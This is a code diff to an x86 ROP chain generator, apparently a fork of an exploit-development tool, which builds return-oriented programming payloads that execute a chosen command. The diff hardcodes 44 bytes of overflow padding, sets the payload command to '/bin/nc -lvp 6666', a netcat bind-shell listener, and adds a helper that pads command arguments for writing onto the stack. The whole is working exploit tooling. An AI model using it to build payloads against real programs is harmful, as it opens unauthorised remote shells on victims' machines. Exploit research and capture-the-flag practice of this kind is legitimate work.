@@ -165,10 +165,13 @@ class ROPMakerX86(object):
             print("\n[-] Error - Can't find a writable section")
             return
 
-        p = b'A' * self.padding
+        #p = b'A' * self.padding
         p = b'A' * 44
-
-        args = [b'/bin//nc',b'-lvp',b'6666']
+        
+        args = [b'/bin/nc',b'-lvp',b'6666']
+        
+        foo = ["/bin/echo","-lvp","6666"]
+        #print(self.PreProcessArgs(foo))
 
         stack = dataAddr
         #-----------------------------stack--------------------------
@@ -475,3 +478,20 @@ class ROPMakerX86(object):
 
         self.__buildRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
         self.customRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
+    
+
+    def PreProcessArgs(self, args):
+        # args [foo, bar, baz]
+        outargs = []
+        for arg in args:
+            if (len(arg) % 4 == 0):         # Does the arg actually need padding?
+                outargs.append(bytes(arg, "utf-8"))
+            else:                           # It does need padding!
+                if "/" in arg:        # Does it contain a path to pad?
+                    indexOfSlash = arg.index("/")
+                    outargs.append(bytes(arg[0:indexOfSlash] + "/"*(4 - len(arg) % 4) + arg[indexOfSlash:len(arg)], "utf-8"))
+                else:                       # Doesn't contain a path - here we pad with some stupid character
+                    outargs.append(bytes(arg, "utf-8") + b'\x07'*(4 - len(arg) % 4))       # Adds 0x07 as some padding character - (it's the bell character)
+                    break; 
+
+        return outargs
